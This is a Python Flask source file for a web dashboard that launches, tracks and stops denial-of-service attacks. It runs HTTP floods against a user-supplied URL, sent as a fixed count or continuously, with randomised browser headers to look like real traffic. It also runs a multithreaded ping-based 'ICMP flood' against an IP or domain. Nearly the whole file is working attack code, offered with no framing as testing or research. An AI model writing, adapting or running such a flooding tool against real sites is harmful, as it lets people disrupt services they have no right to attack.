from flask import Flask, render_template, request, jsonify
import requests
import threading
import time
import re
import subprocess
import platform
import socket
import random
import urllib.parse
from collections import defaultdict
import json
import os
from datetime import datetime

app = Flask(__name__)

# Global variables for attack management
active_attacks = {}
attack_stats = {}

class WebAttackStats:
    def __init__(self, attack_id):
        self.attack_id = attack_id
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.status_codes = defaultdict(int)
        self.response_times = []
        self.lock = threading.Lock()
        self.is_running = False
    
    def update(self, status_code, response_time=None, success=True):
        with self.lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
            self.status_codes[status_code] += 1
            if response_time:
                self.response_times.append(response_time)
    
    def get_stats(self):
        with self.lock:
            if not self.start_time:
                return {}
            
            elapsed = time.time() - self.start_time
            avg_response_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
            success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
            
            return {
                'attack_id': self.attack_id,
                'total_requests': self.total_requests,
                'successful_requests': self.successful_requests,
                'failed_requests': self.failed_requests,
                'success_rate': success_rate,
                'requests_per_second': self.total_requests / elapsed if elapsed > 0 else 0,
                'avg_response_time': avg_response_time,
                'elapsed_time': elapsed,
                'status_codes': dict(self.status_codes),
                'is_running': self.is_running
            }
    
    def start(self):
        self.start_time = time.time()
        self.is_running = True
    
    def stop(self):
        self.is_running = False

def get_realistic_headers():
    """Generate realistic browser headers"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ]
    
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }

def validate_url(url):
    """Validate and clean the URL"""
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.netloc:
            return None
        return url
    except:
        return None

def send_request(url, attack_id, rate_limit_delay=0):
    """Send a single request"""
    stats = attack_stats.get(attack_id)
    if not stats or not stats.is_running:
        return
    
    try:
        start_time = time.time()
        headers = get_realistic_headers()
        response = requests.get(url, timeout=5, headers=headers)
        response_time = time.time() - start_time
        
        stats.update(response.status_code, response_time, True)
        
        if rate_limit_delay > 0:
            time.sleep(rate_limit_delay)
        
        return response.status_code
    except Exception as e:
        stats.update(str(e), None, False)
        return str(e)

def http_flood_worker(url, attack_id, total_requests, rate_limit_delay):
    """Worker function for HTTP flood"""
    stats = attack_stats.get(attack_id)
    if not stats:
        return
    
    stats.start()
    
    for i in range(total_requests):
        if not stats.is_running:
            break
        send_request(url, attack_id, rate_limit_delay)
    
    stats.stop()

def continuous_flood_worker(url, attack_id, rate_limit_delay):
    """Worker function for continuous flood"""
    stats = attack_stats.get(attack_id)
    if not stats:
        return
    
    stats.start()
    
    while stats.is_running:
        send_request(url, attack_id, rate_limit_delay)

def ping_target(ip):
    """Send ping to target IP"""
    try:
        if platform.system().lower() == "windows":
            result = subprocess.run(['ping', '-n', '1', '-w', '1000', ip], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return "Success"
            else:
                return "Failed"
        else:
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return "Success"
            else:
                return "Failed"
    except Exception as e:
        return f"Error: {str(e)}"

def icmp_flood_worker(target_ip, attack_id, thread_count):
    """Worker function for ICMP flood"""
    stats = attack_stats.get(attack_id)
    if not stats:
        return
    
    stats.start()
    
    def ping_worker():
        while stats.is_running:
            result = ping_target(target_ip)
            stats.update(result, None, result == "Success")
            time.sleep(0.1)
    
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=ping_worker)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    stats.stop()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.get_json()
    
    attack_type = data.get('attack_type')
    target = data.get('target')
    protocol = data.get('protocol', 'https')
    total_requests = int(data.get('total_requests', 1000))
    threads = int(data.get('threads', 100))
    rate_limit = float(data.get('rate_limit', 0))
    
    # Generate unique attack ID
    attack_id = f"attack_{int(time.time())}"
    
    if attack_type == 'http_flood':
        # Validate and prepare URL
        if not target.startswith(('http://', 'https://')):
            target = f"{protocol}://{target}"
        
        validated_url = validate_url(target)
        if not validated_url:
            return jsonify({'error': 'Invalid URL format'}), 400
        
        # Create stats tracker
        stats = WebAttackStats(attack_id)
        attack_stats[attack_id] = stats
        
        # Start attack thread
        if data.get('continuous', False):
            thread = threading.Thread(target=continuous_flood_worker, 
                                   args=(validated_url, attack_id, rate_limit))
        else:
            thread = threading.Thread(target=http_flood_worker, 
                                   args=(validated_url, attack_id, total_requests, rate_limit))
        
        thread.daemon = True
        thread.start()
        active_attacks[attack_id] = thread
        
        return jsonify({
            'success': True,
            'attack_id': attack_id,
            'message': f'Attack started on {validated_url}'
        })
    
    elif attack_type == 'icmp_flood':
        # Validate IP/domain
        if not target:
            return jsonify({'error': 'Target IP/domain required'}), 400
        
        # Try to resolve if it's a domain
        try:
            socket.inet_aton(target)
            target_ip = target
        except socket.error:
            # Try to resolve as domain
            try:
                target_ip = socket.gethostbyname(target)
            except socket.gaierror:
                return jsonify({'error': f'Could not resolve {target}'}), 400
        
        # Create stats tracker
        stats = WebAttackStats(attack_id)
        attack_stats[attack_id] = stats
        
        # Start ICMP flood
        thread = threading.Thread(target=icmp_flood_worker, 
                               args=(target_ip, attack_id, threads))
        thread.daemon = True
        thread.start()
        active_attacks[attack_id] = thread
        
        return jsonify({
            'success': True,
            'attack_id': attack_id,
            'message': f'ICMP flood started on {target_ip}'
        })
    
    return jsonify({'error': 'Invalid attack type'}), 400

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    data = request.get_json()
    attack_id = data.get('attack_id')
    
    if attack_id in attack_stats:
        attack_stats[attack_id].stop()
        return jsonify({'success': True, 'message': 'Attack stopped'})
    
    return jsonify({'error': 'Attack not found'}), 404

@app.route('/get_stats/<attack_id>')
def get_stats(attack_id):
    if attack_id in attack_stats:
        stats = attack_stats[attack_id].get_stats()
        return jsonify(stats)
    
    return jsonify({'error': 'Attack not found'}), 404

@app.route('/get_active_attacks')
def get_active_attacks():
    active = []
    for attack_id, stats in attack_stats.items():
        if stats.is_running:
            active.append({
                'attack_id': attack_id,
                'stats': stats.get_stats()
            })
    return jsonify(active)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000) 